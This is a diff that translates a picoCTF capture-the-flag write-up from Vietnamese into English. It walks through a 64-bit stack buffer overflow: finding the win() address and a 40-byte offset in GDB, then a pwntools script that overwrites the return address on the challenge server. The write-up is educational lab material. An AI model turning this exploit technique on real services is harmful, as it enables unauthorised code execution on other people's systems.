@@ -4,184 +4,183 @@
 **Difficulty:** Medium  
 **Author:** YAHAYA MEDDY  
 
-## 1. Mô tả Challenge
+## 1. Challenge Description
 
-Challenge là một dịch vụ echo "secure". Khi kết nối qua netcat:
+The challenge is a "secure" echo service. When connecting via netcat:
 
-![Mô tả challenge trên picoCTF](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/6845169101721a9f385ee67203574c928e7edf34/pwn1.png)
-Kết nối thực tế:
+![Challenge description on picoCTF](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/6845169101721a9f385ee67203574c928e7edf34/pwn1.png)
 
-![Kết nối netcat và giao diện ban đầu](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn2.png)
+Actual connection:
 
-Nhập thử dữ liệu xem chương trình trả ra kết quả gì
+![Netcat connection and initial interface](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn2.png)
 
-![dùng thử chương trình](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn3.png)
+Let's try to input some data to see the program's output:
 
-**Quan sát:** Chương trình phản hồi lại chuỗi Hello kết hợp với dữ liệu mà chúng ta vừa nhập vào, và đi kèm một thông báo thông báo kết thúc.
+![Testing the program](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn3.png)
 
-## 2. Tải file binary và chuẩn bị
-Tải tệp tin thực thi (binary) về môi trường local để tiến hành phân tích kỹ thuật.
+**Observation:** The program responds with the string "Hello" combined with the data we just entered, followed by a termination message.
 
-![Chi tiết challenge và nút copy link](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn4.png)
-*Sao chép đường dẫn tải xuống tệp tin binary.*
+## 2. Downloading Binary and Preparation
 
-![Sử dụng wget tải binary](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn5.png)
+Download the executable file (binary) to your local environment for technical analysis.
 
-*Sử dụng lệnh wget để tải tệp binary về máy.*
+![Challenge details and copy link button](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn4.png)
 
-![Chạy chmod +x vuln.6](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/chaylocal.png)
+*Copy the download link for the binary file.*
 
-*Tiếp theo chúng ta sử dụng câu lệnh chmod +x tên tên file binary để cung cấp quyền chạy trên máy của chúng ta*
+![Using wget to download binary](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn5.png)
+
+*Use the wget command to download the binary file.*
+
+![Running chmod +x vuln.6](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/chaylocal.png)
+
+*Next, we use the command `chmod +x <binary_filename>` to grant execution permissions on our machine.*
+
 
 ---
 
-## 3. Phân tích Source Code
+## 3. Source Code Analysis
 
-Source code được cung cấp:
+Source code provided:
 
 ![Source code vuln.c](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/sourcecodepwn.png)
 
-Phân tích code một chút chúng ta có thể thấy được chương trình chỉ cho buffer 32 bytes nhưng lại cho người dùng nhập vào tối đa lên đến 128 bytes
+Analyzing the code, we can see that the program only allocates a 32-byte buffer but allows the user to input a maximum of up to 128 bytes.
 
-Đây là dấu hiệu rõ ràng của Stack Buffer Overflow hay còn được gọi là tràn bộ đệm
+This is a clear sign of a **Stack Buffer Overflow**.
 
-Bạn có thể liên tưởng đến một cái ly khi bị rót quá đầy thì nước dần dần sẽ tràn ra khu vực khác và trong thử thách này cũng vậy
+You can visualize it like a glass being overfilled; the water gradually spills over into other areas. In this challenge, it's the same.
 
-Mục tiêu của chúng ta là phải làm sao để khiến cho các bytes dữ liệu của chúng ta ghi đè đúng vào vị trí của hàm win từ đó đọc được flag của thử thách này
+Our goal is to figure out how to make our data bytes overwrite the exact position of the `win` function to read the flag.
 
-![Tên mô tả ảnh](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSmEs0fL8NkDoIMjOlkwFWk4YMrjF2YB4YGGw&s)
+![Buffer Overflow Illustration](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSmEs0fL8NkDoIMjOlkwFWk4YMrjF2YB4YGGw&s)
 
-Đây chính là hình ảnh minh họa cho lỗi tràn bộ đệm mà ta đang khai thác
+*This is an illustration of the buffer overflow vulnerability we are exploiting.*
 
-## 4. Debug với gdb và pwndbg
+## 4. Debugging with GDB and Pwndbg
 
-**Đầu tiên và vô cùng quan trọng chúng ta sử dụng câu lện **"file ./ten_file_binary" để check xem cấu hình của file binary**
+**First and foremost, we use the command "file ./<binary_filename>" to check the binary's configuration.**
 
-Sau khi thực thi lệnh này ta có thể thấy được những thông số cơ bản của file như : Tên, Định dạng file là ELF, Kiến trúc là 64-bit, Sắp xếp Bytes là LSB, Tập Lệnh là x86-64, và quan trọng nhất là không stripped
+After executing this command, we can see basic parameters such as: Name, Format (ELF), Architecture (64-bit), Byte Order (LSB), Instruction Set (x86-64), and most importantly, **not stripped**.
 
-Khi file không striped chúng ta có thể dễ dàng tìm thấy các hàm như là 'main', 'win'
+When a file is not stripped, we can easily locate functions like 'main' or 'win'.
 
-![check cau hinh file](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/checkbit.png)
+![Checking file configuration](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/checkbit.png)
 
-Tiếp theo
-Chúng ta quét chuương trình bằng gdb bằng lệnh gdb ./ten_file_binary
+Next, we inspect the program using GDB with the command `gdb ./<binary_filename>`.
 
-![Mở vuln.6 bằng gdb](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn7.png)
+![Opening vuln.6 with GDB](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn7.png)
 
-Chúng ta sử dụng checksec để kiểm tra xem file binary được trang bị những lớp phòng thủ nào
+We use `checksec` to see which security layers are enabled on the binary.
+
 ![checksec](https://github.com/Writeup-Challenge-Le-Nam-Thang/Pwn-Picoctf/blob/329acef68c463e8fcea5890be5aaf7223c4897da/checksec.png)
 
-Quá là may mắn !!!!!
-Có thể thấy rằng file này không có lớp bảo vệ PIE có nghĩa là địa chỉ của hàm win sẽ ở một vị trí cố định và không thay đổi trong suốt quá trình ta chạy chương trình
+**How lucky!**
 
-![Danh sách functions trong binary](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn8.png)
+We can see that this file has no PIE protection, meaning the address of the `win` function will be at a fixed location and will not change during execution.
 
-Việc xem chương trình sử dụng những hàm nào là vô cùng quan trọng
+![List of functions in binary](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn8.png)
 
-Chúng ta có thể xem tất cả các hàm qua gdb bằng câu lệnh 'info function'
+Knowing which functions the program uses is vital. We can view all functions in GDB using the `info function` command.
 
-Sau khi thực thi câu lệnh gdb sẽ hiện ra tất cả các hàm được sử dụng trong khi chạy chương trình
+Next, we find the address of the `win` function by executing `p win` in GDB.
 
+![Finding win address](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn9.png)
 
-Tiếp theo chúng ta tìm địa chỉ hàm main bằng cách thực thi lệnh p main trong gdb từ đó gdb sẽ quét và tìm rồi đưa ra địa chỉ hàm win cho ta
-
-![Tìm địa chỉ hàm main](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn9.png)
-
-Sau khi quét chúng ta nhận được địa chỉ hàm win:
+After scanning, we get the `win` function address:
 **win() address = 0x401256**
 
-## 5. Tìm Offset đến Return Address
+## 5. Finding the Offset to the Return Address
 
-Như mình phân tích ở trên bài này có rất nhiều dấu hiệu cho thấy rằng khả năng cao là lỗi tràn bộ đêm nên chúng ta sẽ tạo một chuỗi kí tự dài hơn chương trình có thể buf nhằm crash chương trình 
+As analyzed above, this looks like a buffer overflow, so we will create a string longer than the buffer to crash the program.
 
-Bằng câu lệnh cyclic 200 ta tạo ra 200 kí tự ngẫu nhiên để nhập vào chương trình nhằm khiến chương trình bị crash
+Using the command `cyclic 200`, we generate 200 random characters to input into the program.
 
-![Tạo cyclic pattern 200 bytes](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn10.png)   <!-- pwn10.png -->
+![Creating cyclic pattern 200 bytes](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn10.png)
 
-Copy chuỗi ký tự và dán vào rồi nhấn enter xem có chuyện gì xảy ra
+Copy the string, paste it, and press Enter to see what happens.
 
-![Chạy binary với cyclic pattern](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn11.png)
-Hehe rất đúng với dự đoán của mình sau khi chạy một chuỗi kí tự dài đã khiến cương trình bị crash và in ra một giá trị bị thừa ra khỏi bảng số liệu của gdb
+![Running binary with cyclic pattern](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn11.png)
 
-Đây chính là giá trị của Register RIP (Register Instruction Pointer) tại thời điểm chương trình crash (Segmentation Fault)
+Hehe, just as predicted! After running the long string, the program crashed and printed a value that "overflowed" into GDB's records.
 
-![Gía trị của Register RIP](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn12.png)
+This is the value of the **RIP Register** (Instruction Pointer) at the time of the crash (Segmentation Fault).
 
-Tìm offset chính xác:
+![Value of Register RIP](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn12.png)
 
-Offset là gì? 
+To find the exact offset:
 
-Chúng ta có thể hiểu nôm na Offset là "khoảng cách" (tính bằng byte) từ điểm bắt đầu của bộ đệm (buffer) cho đến vị trí của địa chỉ trả về (Return Address) trên Stack
+What is an **Offset**? Simply put, it's the "distance" (in bytes) from the start of the buffer to the position of the Return Address on the Stack.
 
-Ta sử dụng lệnh cyclic -l + giá_trị_RIP để tìm offset
+We use the command `cyclic -l <RIP_value>` to find the offset.
 
-![Sử dụng cyclic -l tìm offset](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn13.png)   <!-- pwn13.png -->
+![Using cyclic -l to find offset](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn13.png)
 
-**Kết quả:** Offset = **40 bytes**
+**Result:** Offset = **40 bytes**
 
-## 6. Viết Exploit Script
+## 6. Writing the Exploit Script
 
-Tiếp theo ta là đến bước mình thích nhất và cũng thú vị nhất đó chính là sử dụng thư viện pwntool của python để viết payload dùng để lấy flag
+Now for my favorite and most interesting part: using the **pwntools** library in Python to write the payload to get the flag.
 
-Dưới đây là nội dung file payload của chúng ta
+Here is the content of our exploit file:
 
 ```python
 from pwn import *
 
-HOST = "mysterious-sea.picoctf.net" #tên máy chủ
-PORT = #mã port trong challenge của bạn #port của máy chủ đó
+HOST = "mysterious-sea.picoctf.net" # Server hostname
+PORT = 12345 # Replace with your challenge port
 
-p = remote(HOST, PORT) #kết nối với máy chủ của challenge
+p = remote(HOST, PORT) # Connect to the challenge server
 
-p.recvuntil(b"Please enter your name: ") #chạy chương trình cho đến khi gặp dòng chữ trên sau đó truyền payload ghi ở dưới
+p.recvuntil(b"Please enter your name: ") # Wait for the prompt before sending payload
 
-offset = 40 # đây là offset mà khi nãy ta dùng lệnh cyclic để tìm
-win_addr = 0x401256 #đây là địa chỉ hàm win mà nãy ta đã tìm được
+offset = 40 # Offset found using cyclic
+win_addr = 0x401256 # win function address
 
-payload = b"A" * offset + p64(win_addr) #đây là nội dung payload nhớ là kiểm tra xem file binary là bao nhiêu bit nếu mà là 32 thì sửa p64 thành p32
+# Creating the payload:
+# 40 bytes of junk + the win function address packed as a 64-bit integer
+payload = b"A" * offset + p64(win_addr) 
 
-p.sendline(payload) #gửi mã độc 
-p.interactive() #nhận kết quả
+p.sendline(payload) # Send the payload
+p.interactive() # Switch to interactive mode to see the result
 ```
-Nói qua một chút về payload của mình nhé:
+Let's break down the payload:
 
-```HOST = "mysterious-sea.picoctf.net" # Tên miền của máy chủ bài Lab
-PORT = 12345 # Số hiệu cổng dịch vụ đang chạy bài Lab
-p = remote(HOST, PORT) # Mở một kết nối TCP đến máy chủ đó
 ```
-Những dòng code này dùng để thiết lập đường truyền để giao tiếp với máy chủ của thử thách
+HOST = "mysterious-sea.picoctf.net" # Lab server hostname
+PORT = 12345 # Lab service port
+p = remote(HOST, PORT) # Open TCP connection
+```
+These lines establish the connection to communicate with the challenge server
 
 ```p.recvuntil(b"Please enter your name: ")```
 
-Lắng nghe dữ liệu máy chủ gửi về, chờ cho đến khi thấy dòng chữ yêu cầu nhập tên thì mới bắt đầu thực thi mã độc để đảm bảo không gửi dữ liệu quá sớm khi chương trình chưa thực sự nhận dữ liệu
+Listens to server data and waits for the "name" request to ensure we don't send data too early
 
-```offset = 40 
+```
+offset = 40 
 win_addr = 0x401256
 payload = b"A" * offset + p64(win_addr)
 ```
-Đây là thứ hay ho nhất chính là mã độc của chúng ta
+This is the core of our attack:
 
-Tôi sẽ giải thích một chút về những dòng mã độc này
+b"A" * 40: 40 junk characters to fill the buffer and reach the return address position.
 
-b"A" * 40: Tạo ra 40 ký tự rác để lấp đầy bộ đệm (Buffer) và đè qua các biến phụ trên Stack, chạm tới đúng vị trí của hàm win
-
-p64(win_addr): Đổi địa chỉ hàm win (0x401256) sang dạng byte (Little Endian, 64-bit) để máy tính hiểu được (**Lưu ý:** ở trên khi chúng ta kiểm tra cấu hình file thì có ghi là 64-bit nếu khi chúng ta kiểm tra file mà hiện 32-bit thì phải thay p64 bằng p32 nhé !)
-
-sau đó chúng ta sử dụng hai câu lệnh
+p64(win_addr): Converts the win address (0x401256) into 64-bit byte format (Little Endian). (Note: If the binary was 32-bit, you must use p32!)
 ```
-p.sendline(payload) # Gửi chuỗi tấn công đã chuẩn bị lên máy chủ
-p.interactive()      # Giữ kết nối mở để bạn có thể gõ lệnh trực tiếp
+p.sendline(payload) # Send payload
+p.interactive()     # Keep connection open
 ```
-Hai câu lệnh trên dùng để gửi mã độc và sau khi kết thúc cho phép chúng ta đọc Flag mà máy chủ trả về
+These two command use to Sends the payload and allows us to read the Flag returned by the server
 
-## 7. Thực thi file payload của bạn để lấy flag
-**Lưu ý!!!!: phải để địa chỉ file payload và file binary trong cùng một thư mục**
+## 7. Running your Payload to get the Flag
+***Note: You must keep the payload script and the binary file in the same directory.***
 
-Sau đó chạy lệnh python3 "tên_file_payload.py" sau đó để file payload làm việc của nó thôi
+Run the command python3 <payload_filename>.py and let the script do its work.
 
-Cuối cùng sau khi chạy thì sẽ xuất hiện flag của challenge này :
+Finally, after execution, the flag will appear:
 
-TADA !!!!!! FLAG CỦA TA ĐÂY RỒI
+TADA!!!!!! HERE IS OUR FLAG!
 
 ![FLAG](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/flag.png)
 
